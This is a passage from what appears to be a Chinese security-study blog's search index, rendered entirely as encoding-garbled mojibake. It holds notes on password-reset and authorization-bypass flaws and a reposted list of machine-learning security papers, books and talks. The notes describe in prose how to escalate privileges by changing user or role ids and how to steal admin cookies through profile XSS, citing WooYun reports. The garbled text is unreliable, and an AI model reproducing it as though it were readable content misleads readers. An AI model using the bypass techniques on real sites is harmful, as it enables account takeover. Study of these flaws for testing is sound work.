oppoé‡ç½®ä»»æ„ç”¨æˆ·å¯†ç æ¼æ´(4) å‘é€çŸ­ä¿¡ç­‰éªŒè¯ä¿¡æ¯çš„åŠ¨ä½œåœ¨æœ¬åœ°è¿›è¡Œï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹è¿”å›åŒ…è¿›è¡Œæ§åˆ¶ WooYun: OPPOä¿®æ”¹ä»»æ„å¸å·å¯†ç -3 WooYun: OPPOä¿®æ”¹ä»»æ„å¸å·å¯†ç -2 æ³¨å…¥ åœ¨æ‰¾å›å¯†ç å¤„å­˜åœ¨æ³¨å…¥æ¼æ´ WooYun: ç”¨å‹äººåŠ›èµ„æºç®¡ç†è½¯ä»¶ï¼ˆe-HRï¼‰å¦ä¸€å¤„SQLæ³¨å…¥æ¼æ´ï¼ˆé€šæ€æ‰€æœ‰ç‰ˆæœ¬ï¼‰ Tokenç”Ÿæˆ tokenç”Ÿæˆå¯æ§ WooYun: å¤©å¤©ç½‘ä»»æ„è´¦å·å¯†ç é‡ç½®(éæš´åŠ›æ¸©æŸ”ä¿®æ”¹) WooYun: å¤©å¤©ç½‘å†ä¸€æ¬¡é‡ç½®ä»»æ„è´¦å·å¯†ç (ä¾æ—§éæš´åŠ›) æ³¨å†Œè¦†ç›– æ³¨å†Œé‡å¤çš„ç”¨æˆ·å WooYun: ä¸­é“å¿«è¿å¥‡è‘©æ–¹å¼é‡ç½®ä»»æ„ç”¨æˆ·å¯†ç (adminç”¨æˆ·æ¼”ç¤º) sessionè¦†ç›– WooYun: èšç¾ä¼˜å“ä»»æ„ä¿®æ”¹ç”¨æˆ·å¯†ç (éçˆ†ç ´) è¶Šæƒç›¸å…³é€»è¾‘æ¼æ´ è¶Šæƒæ¼æ´æ˜¯Webåº”ç”¨ç¨‹åºä¸­ä¸€ç§å¸¸è§çš„å®‰å…¨æ¼æ´ã€‚å®ƒçš„å¨èƒåœ¨äºä¸€ä¸ªè´¦æˆ·å³å¯æ§åˆ¶å…¨ç«™ç”¨æˆ·æ•°æ®ã€‚å½“ç„¶è¿™äº›æ•°æ®ä»…é™äºå­˜åœ¨æ¼æ´åŠŸèƒ½å¯¹åº”çš„æ•°æ®ã€‚è¶Šæƒæ¼æ´çš„æˆå› ä¸»è¦æ˜¯å› ä¸ºå¼€å‘äººå‘˜åœ¨å¯¹æ•°æ®è¿›è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥è¯¢æ—¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚çš„æ•°æ®è¿‡åˆ†ç›¸ä¿¡è€Œé—æ¼äº†æƒé™çš„åˆ¤å®šã€‚æ‰€ä»¥æµ‹è¯•è¶Šæƒå°±æ˜¯å’Œå¼€å‘äººå‘˜æ‹¼ç»†å¿ƒçš„è¿‡ç¨‹ã€‚ å¸¸è§æ‰‹æ³• æ“ä½œæ—¶åˆ†æè¯·æ±‚ä¸­çš„æ•°æ®åŒ…ï¼Œçœ‹çœ‹æ¯ä¸ªå‚æ•°çš„ä½œç”¨ï¼Œä¿®æ”¹å‚æ•°æŸ¥çœ‹å˜åŒ–ã€‚ æ‹¥æœ‰æ›´å¤šæƒé™çš„è´¦å·ï¼ŒæŠŠèƒ½è®¿é—®çš„URLéƒ½æå–å‡ºæ¥ï¼Œç»™ä½æƒé™ç”¨æˆ·è®¿é—®æˆ–è€…ç›´æ¥è®¿é—®ï¼ŒæŸ¥çœ‹èƒ½å¦è®¿é—®ã€‚ çŒœæµ‹éšè—çš„APIï¼Œå¦‚:guest/getorderï¼Œä¿®æ”¹æˆadmin/getorderã€‚ é€šè¿‡æœç´¢å¼•æ“ï¼Œæˆ–è€…æå–JSä¸­çš„URLï¼ŒæŸ¥æ‰¾éšè—åŠŸèƒ½ã€‚å¦‚burpsuiteä¸­æœ‰ä¸€ä¸ªBHP JS scraperçš„æ’ä»¶ã€‚ çŒœæµ‹éšè—çš„å‚æ•°ï¼Œæ·»åŠ è¿›å»æŸ¥çœ‹å˜åŒ–ï¼Œå¦‚ä¿®æ”¹ä¿¡æ¯çš„æ—¶å€™åŠ ä¸ªIDã€‚ æŠ“å–æ‰€æœ‰çš„æ•°æ®åŒ…ï¼Œæœç´¢ç”¨æˆ·åç­‰å…³é”®è¯ï¼Œæ¯”å¦‚æˆ‘çš„ç”¨æˆ·åæ˜¯testï¼Œåœ¨burpsuiteä¸­çš„HTTP historyæœç´¢testï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å“ªä¸ªæ•°æ®åŒ…åŒ…å«è¿™ä¸ªå‚æ•°,å°†å…¶ä¿®æ”¹ä¸ºå…¶ä»–çš„ç”¨æˆ·åï¼ŒæŸ¥çœ‹å˜åŒ–ã€‚ JSRCâ€”â€”è¶Šæƒæ¼æ´æŒ–æ˜ JSRCâ€”â€”èŠèŠè¶Šæƒé‚£äº›äº‹ æˆ‘çš„è¶Šæƒä¹‹é“ å‚ç›´è¶Šæƒçš„æ‰‹æ³•ï¼š ç¼–è¾‘ä¸ªäººä¿¡æ¯çš„æ—¶å€™ï¼Œä¿®æ”¹æƒé™ç»„çš„idï¼Œä¸€èˆ¬ç®¡ç†å‘˜çš„å€¼ä¸º0æˆ–è€…1ï¼› åå°ä¿®æ”¹å¯†ç çš„åœ°æ–¹ï¼Œå¦‚æœæ˜¯æ ¹æ®useridæ¥ä¿®æ”¹å¯†ç çš„ï¼Œå¯ä»¥ä¿®æ”¹idçš„å€¼æ¥ä¿®æ”¹ç®¡ç†å‘˜çš„å¯†ç ï¼› åœ¨ä¸ªäººèµ„æ–™å¤„æ’å…¥XSSè„šæœ¬ï¼Œä¸€èˆ¬èƒ½æ‰“åˆ°ç®¡ç†å‘˜cookieçš„æ¦‚ç‡å¾ˆå¤§ï¼› æŸ¥çœ‹ä¸ªäººèµ„æ–™çš„æ—¶å€™ï¼Œå¦‚æœæ˜¯æ ¹æ®idæ¥æ˜¾ç¤ºï¼Œä¸€èˆ¬éƒ½æœ‰è¶Šæƒï¼Œå¯ä»¥éå†idè·å–ç®¡ç†å‘˜ä¿¡æ¯ï¼› æµ‹è¯•åå°åŠŸèƒ½ï¼Œæ‰¾ä¸€ä¸‹æ³¨å…¥ã€ä¸Šä¼ ã€å‘½ä»¤æ‰§è¡Œç­‰æ¼æ´ï¼Œç›´æ¥æ‹¿ä¸‹æ•°æ®åº“æƒé™æˆ–è€…shellï¼Œå†æ‰¾ç®¡ç†å‘˜æƒé™å°±è½»è€Œæ˜“ä¸¾äº†ã€‚ å…¶ä»–èµ„æ–™ ä¸šåŠ¡é€»è¾‘æ¼æ´æ€»ç»“ JSRCâ€”â€”ä¸šåŠ¡é€»è¾‘æ¼æ´æŒ–æ˜ JSRCâ€”â€”äº¤æ˜“æ”¯ä»˜æ¼æ´æŒ–æ˜ JSRCâ€”â€”Webæ¼æ´ä¹‹é€»è¾‘æ¼æ´æŒ–æ˜ JSRCâ€”â€”æ‰¹é‡Webæ¼æ´æŒ–æ˜ Reference [çº¢æ—¥å®‰å…¨]Webå®‰å…¨Day6 - ä¸šåŠ¡é€»è¾‘æ¼æ´å®æˆ˜æ”»é˜² å¯†ç æ‰¾å›é€»è¾‘æ¼æ´æ€»ç»“","tags":[{"name":"webå®‰å…¨å­¦ä¹ ","slug":"webå®‰å…¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"é€»è¾‘æ¼æ´","slug":"é€»è¾‘æ¼æ´","permalink":"http://ca0y1h.top/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™ï¼ˆè½¬ï¼‰","date":"2020-01-17T02:49:44.000Z","path":"Machine_learning/æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™ï¼ˆè½¬ï¼‰/","text":"æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™ï¼ˆè½¬ï¼‰ å¤–åª’ KDnuggets åˆŠç™»äº†ä¸€ç¯‡æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™å¤§æ±‡æ€»ï¼Œæ–‡ä¸­åˆ—å‡ºäº†ç›¸å…³æ•°æ®æºçš„è·å–é€”å¾„ï¼Œä¼˜ç§€çš„è®ºæ–‡å’Œä¹¦ç±ï¼Œä»¥åŠä¸°å¯Œçš„æ•™ç¨‹ã€‚å¤§éƒ¨åˆ†éƒ½æ˜¯ä½œè€…åœ¨æ—¥å¸¸å·¥ä½œå’Œå­¦ä¹ ä¸­äº²è‡ªä½¿ç”¨å¹¶è®¤ä¸ºå€¼å¾—å®‰åˆ©çš„çº¯å¹²è´§ã€‚ æ•°æ®æº SecRepo.com ç½‘ç«™ï¼Œè¯¥ç½‘ç«™æ±‡èšäº†å¤§é‡çš„ä¸æœºå™¨å­¦ä¹ å’Œç½‘ç»œå®‰å…¨ç›¸å…³çš„æ•°æ®æºï¼Œå¹¶æä¾›å…è´¹ä¸‹è½½ã€‚æ®ç½‘ç«™é¦–é¡µä»‹ç»ï¼Œæ‰€æœ‰å¯ç”¨çš„æ•°æ®æºåŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼šä¸€æ˜¯ç½‘ç«™æ–¹é¢è‡ªå·±æ•´ç†çš„ï¼ŒäºŒæ˜¯æ¥è‡ªç¬¬ä¸‰æ–¹çš„ã€‚å…¶å†…å®¹åŒ…æ‹¬äº’è”ç½‘æ‰«ææ•°æ®ï¼Œæ¶æ„è½¯ä»¶æºç ï¼Œä»¥åŠå’Œç½‘ç»œå®‰å…¨ç›¸å…³çš„ç³»ç»Ÿæ—¥å¿—ç­‰ã€‚ è®ºæ–‡ 1. Fast, Lean, and Accurate: Modeling Password Guessability Using Neural Networks æœ¬æ–‡æ¥è‡ªå¡å†…åŸºæ¢…éš†å¤§å­¦ï¼Œåˆ†æäº†é€šç”¨ç¬¦å·å¯†ç çš„è„†å¼±æ€§ï¼Œä»¥åŠç›®å‰å¸¸è§çš„å¯†ç å¥å£®æ€§æ£€éªŒçš„å„ç§ç¼ºç‚¹ï¼Œç”šè‡³ç»™å‡ºäº†ä»–ä»¬åœ¨å®éªŒå®¤åˆ©ç”¨ç¥ç»ç½‘ç»œç®—æ³•æ”»ç ´å„ç§ç¬¦å·å¯†ç çš„å…·ä½“æ­¥éª¤ï¼Œéå¸¸å¼ºå¤§ã€‚ 2. Outside the Closed World: On Using Machine Learning for Network Intrusion Detection æœ¬æ–‡æ¥è‡ªåŠ å·ä¼¯å…‹åˆ©å¤§å­¦ï¼Œåˆ†æäº†åˆ©ç”¨æœºå™¨å­¦ä¹ æ¢æµ‹ç½‘ç»œå®‰å…¨çš„ä¼˜åŠ¿å’ŒåŠ£åŠ¿ï¼Œå¹¶ç»™å‡ºäº†ä¸€äº›æ”¹å–„è¿™äº›åŠ£åŠ¿çš„è§£å†³æ–¹æ¡ˆã€‚ 3. Anomalous Payload-Based Network Intrusion Detection é€šå¸¸ä¸€ä¸ªäº’è”ç½‘ä¸Šçš„æ¶æ„è¯·æ±‚éƒ½ä¼šåœ¨çœŸæ­£çš„æ¶æ„ä»£ç å¤–éƒ¨åŒ…è£…ä¸€å±‚å–„æ„çš„å¤–è¡£ï¼Œè¿™å¤§å¤§é˜»ç¢äº†ç›¸å…³æ¢æµ‹ç¨‹åºçš„æ­£å¸¸å·¥ä½œã€‚æ¥è‡ªå“¥ä¼¦æ¯”äºšå¤§å­¦çš„Ke Wangå’ŒSalvatore J. Stolfoä¸¤ä½å­¦è€…åœ¨æœ¬æ–‡ä¸­ç»™å‡ºäº†ä¸€ç§å…¨æ–°çš„æ¢æµ‹æ¶æ„ä»£ç ä¸­æœ‰æ•ˆä»£ç æ®µçš„æ–¹æ³•ï¼Œå¹¶åœ¨å®æµ‹ä¸­è¾¾åˆ°äº†æ¥è¿‘100%æ­£ç¡®ç‡å’Œ0.1%çš„è¯¯æŠ¥ç‡ã€‚ 4. Malicious PDF detection using metadata and structural features å½“å‰ï¼Œéšç€é˜²èŒƒæªæ–½çš„å‡çº§ï¼Œæ¶æ„ä»£ç éšè—åœ¨PDFå’ŒWordç­‰æ–‡æœ¬æ–‡ä»¶ä¸­çš„ä¾‹å­å±¡è§ä¸é²œï¼Œç”¨æˆ·é˜²ä¸èƒœé˜²ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæ¥è‡ªä¹”æ²»æ¢…æ£®å¤§å­¦çš„å­¦è€…ä»‹ç»äº†ä¸€ç§é€šè¿‡æœºå™¨å­¦ä¹ æŠ€æœ¯æ¢æµ‹æ¶æ„æ–‡æœ¬æ–‡ä»¶çš„æŠ€æœ¯ï¼Œç‰¹åˆ«æ˜¯å†…å«æ¶æ„ä»£ç çš„PDFæ–‡ä»¶ã€‚ 5. Adversarial support vector machine learning æ¥è‡ªå¾·å·å¤§å­¦ï¼Œä»‹ç»äº†ä¸¤ç§åˆ©ç”¨æœºå™¨å­¦ä¹ æŠ€æœ¯æ¢æµ‹ç½‘ç»œæ¶æ„æ”»å‡»çš„åˆ†ææ¨¡å‹ï¼Œå³æ— è¾¹ç•Œæ”»å‡»æ¨¡å‹ï¼ˆfree-range attack modelï¼‰å’Œé™åˆ¶è¾¹ç•Œæ”»å‡»æ¨¡å‹ï¼ˆrestrained attack modelï¼‰ã€‚ 6. Exploiting machine learning to subvert your spam filter åƒåœ¾é‚®ä»¶è¿‡æ»¤ç³»ç»Ÿä¸ç®—ä»€ä¹ˆé«˜æ–°æŠ€æœ¯ï¼Œä½†å¦‚ä½•æå‡è¿‡æ»¤çš„å‡†ç¡®æ€§ä¸€ç›´æ˜¯ä¸€ä¸ªéš¾é¢˜ã€‚æœ¬æ–‡ä¸­æ¥è‡ªåŠ å·ä¼¯å…‹åˆ©å¤§å­¦çš„å­¦è€…ä»¬ä»‹ç»äº†ä¸€ç§åŸºäºæœºå™¨å­¦ä¹ å¼€å‘çš„åƒåœ¾é‚®ä»¶è¿‡æ»¤å™¨ï¼Œä¸ºåƒåœ¾é‚®ä»¶çš„è¿‡æ»¤æä¾›äº†ä¸€ç§å…¨æ–°çš„å®ç°æ€è·¯ã€‚ ä»¥ä¸‹è®ºæ–‡æ¥è‡ª covert.io ç½‘ç«™ï¼Œè¯¥ç½‘ç«™çš„è®ºæ–‡ï¼ˆæˆ–åšå®¢ï¼‰æ•°é‡åºå¤§ï¼Œä½†å¹¶ä¸åƒä¸Šæ–‡æåˆ°çš„é‚£äº›è®ºæ–‡ä¸€æ ·å…¨éƒ¨æ¥è‡ªç¾å›½é«˜æ ¡ï¼Œcovert.io çš„æ–‡ç« ä¹Ÿæ¥è‡ªå„å¤§ç§‘æŠ€å…¬å¸å’Œç ”ç©¶æ‰€ã€‚ [7. CAMP: Content-Agnostic Malware Protection](http://www.covert.io/research-papers/security/CAMP - Content Agnostic Malware Protection.pdf) æ¥è‡ªè°·æ­Œï¼Œä»‹ç»äº†ä¸€ç§åä¸ºCAMPçš„æ¶æ„è½¯ä»¶ä¿æŠ¤ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿèƒ½å¤Ÿé€šè¿‡å¯¹äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶çš„æ¢æµ‹ï¼Œç¡®ä¿äº’è”ç½‘çš„è½¯ä»¶åº”ç”¨å®‰å…¨ã€‚ [8. Building a Dynamic Reputation System for DNS](http://www.covert.io/research-papers/security/Notos - Building a dynamic reputation system for dns.pdf) DNSæœåŠ¡å™¨ä¸€ç›´æ˜¯äº’è”ç½‘ä¸­éå¸¸é‡è¦çš„ç»„æˆéƒ¨åˆ†ï¼Œé’ˆå¯¹ç›®å‰è¶Šæ¥è¶Šæµè¡Œçš„DNSæ”»å‡»ï¼Œæ¥è‡ªä¹”æ²»äºšç†å·¥å­¦é™¢çš„å­¦è€…ä»‹ç»äº†ä¸€ç§åä¸ºNotosçš„åŠ¨æ€çš„åŸŸåä¿¡èª‰ç³»ç»Ÿï¼Œå¯ä»¥æœ‰æ•ˆé˜²èŒƒå„ç§é’ˆå¯¹DNSæœåŠ¡å™¨çš„åŒ¿åçš„ç½‘ç»œé»‘å®¢æ”»å‡»ã€‚ [9. Detecting malware domains at the upper dns hierarchy](http://www.covert.io/research-papers/security/Kopis - Detecting malware domains at the upper dns hierarchy.pdf) æœ¬æ–‡ä»‹ç»äº†ä¸€ç§åä¸ºKopisçš„æ–°å‹åŸŸåæ£€æµ‹ç³»ç»Ÿï¼Œå¯ä»¥æœ‰æ•ˆæ¢æµ‹äº’è”ç½‘ä¸ŠåŒ…å«æ¶æ„æ”»å‡»ä»£ç çš„åŸŸåï¼Œç”±ç½‘ç»œå®‰å…¨å…¬å¸Damballaã€ä¹”æ²»äºšç†å·¥å­¦é™¢å’Œä¹”æ²»äºšå¤§å­¦è”åˆç ”å‘ã€‚ [10. From Throw-away Traffic To Bots â€“ Detecting The Rise Of DGA-based Malware](http://www.covert.io/research-papers/security/From throw-away traffic to bots - detecting the rise of dga-based malware.pdf) æœ¬æ–‡åŒæ ·æ¥è‡ªDamballaå…¬å¸å’Œä¹”æ²»äºšå¤§å­¦ï¼Œä»‹ç»äº†ä¸€ç§é’ˆå¯¹åƒµå°¸ç½‘ç»œçš„æ–°æŠ€æœ¯ï¼Œè¯¥æŠ€æœ¯å¤Ÿæ¢æµ‹æ¥è‡ªåŠ¨æ€åŸŸåç³»ç»Ÿçš„æ¶æ„æ”»å‡»ï¼Œæ•´åˆäº†èšåˆå’Œåˆ†ç±»ä¸¤ç±»ç®—æ³•ã€‚ [11. EXPOSURE: Finding Malicious Domains Using Passive DNS Analysis](http://www.covert.io/research-papers/security/Exposure - Finding malicious domains using passive dns analysis.pdf) DNSæœåŠ¡å™¨æˆä¸ºäº†è¶Šæ¥è¶Šå¤šé»‘å®¢çš„æ”»å‡»å¯¹è±¡ï¼Œæœ¬æ–‡ä»‹ç»äº†ä¸€ç§åä¸ºEXPOSUREçš„åŸŸååˆ†æç³»ç»Ÿï¼Œå¯ä»¥é’ˆå¯¹å¤§æ‰¹é‡çš„åŸŸåæ¶æ„è®¿é—®è¿›è¡Œæ¢æµ‹ï¼Œç”±Eurecomç ”ç©¶æ‰€ã€æ³¢å£«é¡¿ä¸œåŒ—å¤§å­¦å’ŒåŠ å·å¤§å­¦å…±åŒç ”å‘ã€‚ [12. Polonium: Tera-Scale Graph Mining for Malware Detection](http://www.covert.io/research-papers/security/Polonium - Tera-Scale Graph Mining for Malware Detection.pdf) æœ¬æ–‡æ¥è‡ªç½‘ç»œå®‰å…¨å…¬å¸Symantecã€å¡å†…åŸºæ¢…éš†å¤§å­¦ï¼Œä»‹ç»äº†ä¸€ä¸ªåä¸ºPoloniumçš„é«˜æ•ˆçš„å¯æ‰©å±•çš„æ¶æ„è½¯ä»¶æ¢æµ‹ç³»ç»Ÿã€‚ [13. Nazca: Detecting Malware Distribution in Large-Scale Networks](http://www.covert.io/research-papers/security/Nazca - Detecting Malware Distribution in Large-Scale Networks.pdf) å¤§é‡ç”¨æˆ·åœ¨ç°å®ç”Ÿæ´»ä¸­ä¸‹è½½å¹¶å®‰è£…æ¶æ„è½¯ä»¶çš„è¡Œä¸ºé€šå¸¸åŒ…å«ä¸€å®šçš„è§„å¾‹æ€§ã€‚æ¥è‡ªåŠ å·å¤§å­¦åœ£å·´å·´æ‹‰åˆ†æ ¡ã€Naruså…¬å¸çš„å­¦è€…ä»¬å°†è¿™äº›æ— äººé—®æ´¥çš„æ•°æ®åˆ©ç”¨èµ·æ¥ï¼Œæå‡ºäº†ä¸€ä¸ªåä¸ºNazcaçš„ç½‘ç»œå®‰å…¨æ¢æµ‹ç³»ç»Ÿã€‚ [14. Anagram: A Content Anomaly Detector Resistant to Mimicry Attack](http://www.covert.io/research-papers/security/Anagram - A Content Anomaly Detector Resistant to Mimicry Attack.pdf) æ¥è‡ªå“¥ä¼¦æ¯”äºšå¤§å­¦ï¼Œä»‹ç»äº†ä¸€ä¸ªåä¸ºAnagramçš„å¼‚å¸¸æ•°æ®æŠ¥æ–‡æ¢æµ‹å™¨ã€‚ ä¹¦ç± è®²è¿°æ•°æ®ç§‘å­¦å’Œæœºå™¨å­¦ä¹ åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸçš„åº”ç”¨çš„ä¹¦ç±å¹¶ä¸å¤šï¼Œä½œè€…åªä»‹ç»äº†ä»¥ä¸‹ä¸¤æœ¬ã€‚ 1. Data Mining and Machine Learning in Cybersecurity ä½œè€…æ˜¯æ¥è‡ªè·¯æ˜“æ–¯å®‰é‚£ç†å·¥å¤§å­¦çš„Sumeet Duaåšå£«å’ŒXian Duåšå£«ï¼Œæ¢è®¨äº†ç›®å‰æ™®éå­˜åœ¨çš„ç½‘ç»œå®‰å…¨é—®é¢˜ä»¥åŠæœ€å…ˆè¿›çš„æœºå™¨å­¦ä¹ å’Œæ•°æ®æŒ–æ˜è§£å†³æ–¹æ¡ˆã€‚ 2. Machine Learning and Data Mining for Computer Security ç¼–è€…æ˜¯æ¥è‡ªä¹”æ²»åŸå¤§å­¦çš„Marcus A. Maloofï¼Œè¯¥ä¹¦ç³»ç»Ÿä»‹ç»äº†æ•°æ®æŒ–æ˜å’Œæœºå™¨å­¦ä¹ æŠ€æœ¯åœ¨è®¡ç®—æœºå®‰å…¨é¢†åŸŸçš„æœ€æ–°ç ”ç©¶æˆæœã€‚ ç›®å‰ä¸¤æœ¬ä¹¦éƒ½æ²¡æœ‰ä¸­æ–‡ç‰ˆï¼Œçº¸è´¨ç‰ˆåœ¨äºšé©¬é€Šä¸Šçš„å”®ä»·éƒ½è¶…è¿‡1000äººæ°‘å¸ï¼Œç¬¬ä¸€æœ¬æœ‰Kindleç”µå­ç‰ˆã€‚ æ¼”è®² åŸæ–‡ä½œè€…æ”¶é›†äº†å¦‚ä¸‹ä¸€äº›å…³äºæœºå™¨å­¦ä¹ å’Œç½‘ç»œå®‰å…¨çš„æ¼”è®²ï¼Œæ¼”è®²è€…ä»¬è¦ä¹ˆæ˜¯æ¥è‡ªç›¸å…³é¢†åŸŸçš„å…¬å¸å‰¯æ€»ã€æŠ€æœ¯è´Ÿè´£äººï¼Œè¦ä¹ˆæ˜¯å„å¤§é«˜æ ¡çš„ç ”ç©¶äººå‘˜ã€åšå£«æˆ–è€…æ•™æˆã€‚ 1. Using Machine Learning to Support Information Security è§†é¢‘ç³»ç»Ÿä»‹ç»äº†æœºå™¨å­¦ä¹ åœ¨ä¿¡æ¯å®‰å…¨é¢†åŸŸçš„åº”ç”¨ï¼Œæ—¶é•¿çº¦1å°æ—¶ã€‚ 2. Defending Networks with Incomplete Information è¦åœ¨é™å®šçš„æ—¶é—´å†…ï¼ˆé€šå¸¸æ˜¯24å°æ—¶ï¼‰å¯¹æ¶æ„æ”»å‡»åšå‡ºååº”é€šå¸¸éœ€è¦è€—è´¹å·¨å¤§çš„äººåŠ›å’Œç‰©åŠ›ï¼Œä½†æ˜¯å¦‚æœåˆ©ç”¨æœºå™¨å­¦ä¹ çš„æ–¹æ³•ï¼Œé¦–å…ˆå¯¹ç½‘ç»œæ”»å‡»è¿›è¡Œä¼˜å…ˆçº§å’Œæ”»å‡»æ–¹å¼åˆ†ç±»ï¼Œç”šè‡³å¤„ç†ä¸€äº›ç®€å•çš„å¥—è·¯å¼çš„æ”»å‡»ï¼Œåˆ™å¯ä»¥å¤§å¤§é™ä½ç½‘ç»œå®‰å…¨å·¥ç¨‹å¸ˆçš„å·¥ä½œå¼ºåº¦ã€‚æœ¬è§†é¢‘å°±ä»‹ç»äº†è¿™ä¸€æ€è·¯çš„å…·ä½“åº”ç”¨ï¼Œæ—¶é•¿çº¦47åˆ†é’Ÿã€‚ 3. Applying Machine Learning to Network Security Monitoring è¿™ä¸ªè§†é¢‘ä»‹ç»äº†å¦‚ä½•å°†æœºå™¨å­¦ä¹ åº”ç”¨äºç½‘ç»œå®‰å…¨æ¢æµ‹ï¼Œæ—¶é•¿çº¦1å°æ—¶ã€‚ 4. Measuring the IQ of your Threat Intelligence Feed ç›®å‰äº’è”ç½‘ä¸Šå­˜åœ¨ç€å„ç§å„æ ·çš„ç½‘ç»œå®‰å…¨çš„æ¢æµ‹ç³»ç»Ÿï¼Œä½†æ˜¯ç”¨æˆ·å¯¹å®ƒä»¬è¤’è´¬ä¸ä¸€ï¼Œç©¶ç«Ÿå¦‚ä½•åˆ¤æ–­ä¸€ä¸ªæ¢æµ‹ç³»ç»Ÿçš„å¯é æ€§ï¼Œè§†é¢‘ä»‹ç»äº†ä¸€ç§å®ç”¨çš„åˆ¤æ–­æ–¹æ³•ï¼Œæ—¶é•¿çº¦40åˆ†é’Ÿã€‚ 5. Data-Driven Threat Intelligence: Metrics On Indicator Dissemination And Sharing è§†é¢‘ä»‹ç»äº†æ•°æ®é©±åŠ¨ä¸‹çš„å®‰å…¨æƒ…æŠ¥åˆ†æï¼Œç‰¹åˆ«æ˜¯å’Œç¤¾äº¤ç½‘ç»œåˆ†äº«å’Œä¼ æ’­ç›¸å…³çš„ï¼Œæ—¶é•¿çº¦48åˆ†é’Ÿã€‚ 6. Applied Machine Learning for Data Exfil and Other Fun Topics ä¸ºäº†å¸®åŠ©ç½‘ç»œå®‰å…¨ç›¸å…³çš„ç ”ç©¶è€…ã€åˆ†æå¸ˆå’Œæå®¢çˆ±å¥½è€…äº†è§£æœºå™¨å­¦ä¹ ï¼Œä»¥åŠå¦‚ä½•å°†æœºå™¨å­¦ä¹ åº”ç”¨åœ¨ç½‘ç»œå®‰å…¨ä¸­é¢†åŸŸä¸­ï¼Œä¾‹å¦‚æ•°æ®æ³„éœ²ï¼Œæœ¬è§†é¢‘åšäº†è¯¦ç»†ä»‹ç»ï¼Œæ—¶é•¿çº¦43åˆ†é’Ÿã€‚ 7. Secure Because Math: A Deep-Dive on ML-Based Monitoring è§†é¢‘ä»‹ç»äº†ä»¥æœºå™¨å­¦ä¹ æŠ€æœ¯ä¸ºåŸºç¡€çš„äº’è”ç½‘ç›‘æ§ï¼Œæ—¶é•¿çº¦46åˆ†é’Ÿã€‚ 8. Machine Duping 101: Pwning Deep Learning Systems 44åˆ†é’Ÿæ•™ä½ æ”»å…‹ä¸€ä¸ªæ·±åº¦å­¦ä¹ ç³»ç»Ÿï¼Œå¿…çœ‹ç³»åˆ—ã€‚ 9. Weaponizing Data Science for Social Engineering è§†é¢‘ä»‹ç»äº†ç¤¾äº¤ç½‘ç»œä¸­çš„æ¶æ„æ”»å‡»è¡Œä¸ºå’Œæ•°æ®ç§‘å­¦å¯¹æ­¤å¯èƒ½å‘æŒ¥çš„ä½œç”¨ï¼Œæ—¶é•¿çº¦44åˆ†é’Ÿã€‚ 10. Defeating Machine Learning What Your Security Vendor Is Not Telling You è¿˜æ˜¯å…³äºæ”»ç ´æœºå™¨å­¦ä¹ çš„è¯é¢˜ï¼Œè§†é¢‘ä»‹ç»äº†å¦‚ä½•æ”»ç ´ä»¥æœºå™¨å­¦ä¹ ä¸ºåŸºç¡€çš„äº’è”ç½‘å®‰å…¨äº§å“ï¼Œæ—¶é•¿çº¦50åˆ†é’Ÿã€‚ 11. CrowdSource: Crowd Trained Machine Learning Model for Malware Capability Det è§†é¢‘ä»‹ç»äº†å¦‚ä½•åˆ©ç”¨æœºå™¨å­¦ä¹ æ¨¡å‹æ¥æ¢æµ‹äº’è”ç½‘å®‰å…¨ï¼Œæ—¶é•¿çº¦28åˆ†é’Ÿã€‚ 12. Defeating Machine Learning: Systemic Deficiencies for Detecting Malware ç³»ç»Ÿçš„â€œç¼ºé™·â€ä¹Ÿèƒ½ç”¨æ¥æ¢æµ‹æ¶æ„è½¯ä»¶ï¼Ÿè¿™ä¸ªè§†é¢‘ç”¨45åˆ†é’Ÿä¸ºä½ è¯¦ç»†è®²è§£åˆ©ç”¨æœºå™¨å­¦ä¹ å’Œç³»ç»Ÿâ€œç¼ºé™·â€æ¥æ¢æµ‹æ¶æ„è½¯ä»¶çš„æ–¹æ³•ã€‚ 13. Packet Capture Village â€“ Theodora Titonis â€“ How Machine Learning Finds Malware è§†é¢‘ä»‹ç»äº†å¦‚ä½•åˆ©ç”¨æœºå™¨å­¦ä¹ æ¢æµ‹ç§»åŠ¨ç«¯æ¶æ„è½¯ä»¶ï¼Œæ—¶é•¿çº¦44åˆ†é’Ÿã€‚ 14. Build an Antivirus in 5 Min â€“ Fresh Machine Learning è§†é¢‘ç”¨5åˆ†é’Ÿä»‹ç»äº†å¦‚ä½•ç”¨äº’è”ç½‘ä¸Šå¼€æºçš„æœºå™¨å­¦ä¹ æ¡†æ¶ç¼–å†™ä¸€ä¸ªå…¨æ–°çš„é˜²ç—…æ¯’ç¨‹åºã€‚ 15. Hunting for Malware with Machine Learning è§†é¢‘ä»‹ç»äº†é’ˆå¯¹ä¼ä¸šç”¨æˆ·çš„è‡ªåŠ¨åŒ–æ¶æ„è½¯ä»¶æ¢æµ‹ç³»ç»Ÿï¼Œæ—¶é•¿çº¦48åˆ†é’Ÿã€‚ é¡¹ç›®å’Œæ•™ç¨‹ 1. Click Security Data Hacking Project 